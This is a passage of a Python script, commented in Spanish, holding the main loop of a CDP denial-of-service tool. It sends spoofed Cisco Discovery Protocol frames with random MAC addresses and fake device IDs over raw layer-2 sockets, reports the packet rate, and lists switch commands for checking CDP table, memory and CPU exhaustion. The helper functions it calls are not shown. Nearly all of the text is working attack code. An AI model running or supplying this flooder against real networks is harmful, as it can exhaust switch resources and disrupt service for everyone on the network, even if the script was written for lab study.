# ==============================================================
# FUNCION PRINCIPAL
# ==============================================================

def cdp_dos_attack(iface: str, count: int, delay: float) -> None:
    """
    Ejecuta el ataque DoS CDP enviando paquetes falsificados.

    Args:
        iface : Interfaz de red (ej: eth0)
        count : Numero de paquetes a enviar (0 = infinito)
        delay : Tiempo de espera entre paquetes (segundos)
    """
    print_banner(iface, count, delay)

    sent       = 0
    errors     = 0
    start_time = time.time()

    print("[*] Iniciando envio de paquetes CDP falsificados...")
    print("[*] Presiona Ctrl+C para detener\n")

    try:
        while True:
            # Generar identidad falsa unica por paquete
            src_mac   = random_mac()
            device_id = f"Cisco-CDP-{random.randint(100000, 999999)}"

            try:
                raw_frame = build_cdp_packet(src_mac, device_id)

                # Scapy - enviar frame raw en la interfaz
                # conf.L2socket permite enviar frames L2 raw
                sock = conf.L2socket(iface=iface)
                sock.send(raw_frame)
                sock.close()
                sent += 1

            except Exception as e:
                errors += 1
                if errors <= 3:
                    print(f"[!] Error al enviar paquete: {e}")

            # Progreso cada 100 paquetes
            if sent % 100 == 0:
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"[+] Paquetes enviados: {sent:6d} | Errores: {errors} | "
                      f"Velocidad: {pps:.1f} pkt/s | Tiempo: {elapsed:.1f}s")

            # Condicion de parada
            if count > 0 and sent >= count:
                break

            if delay > 0:
                time.sleep(delay)

    except KeyboardInterrupt:
        print("\n[!] Ataque detenido por el usuario.")

    # Resumen final
    elapsed = time.time() - start_time
    print("\n" + "=" * 60)
    print("  RESUMEN DEL ATAQUE")
    print("=" * 60)
    print(f"  Total paquetes enviados : {sent}")
    print(f"  Errores                 : {errors}")
    print(f"  Tiempo total            : {elapsed:.2f} segundos")
    print(f"  Promedio                : {sent/elapsed:.1f} paquetes/seg")
    print("=" * 60)
    print("\n[INFO] Verificar en el switch:")
    print("  Switch# show cdp neighbors")
    print("  Switch# show processes memory | include CDP")
    print("  Switch# show processes cpu sorted")


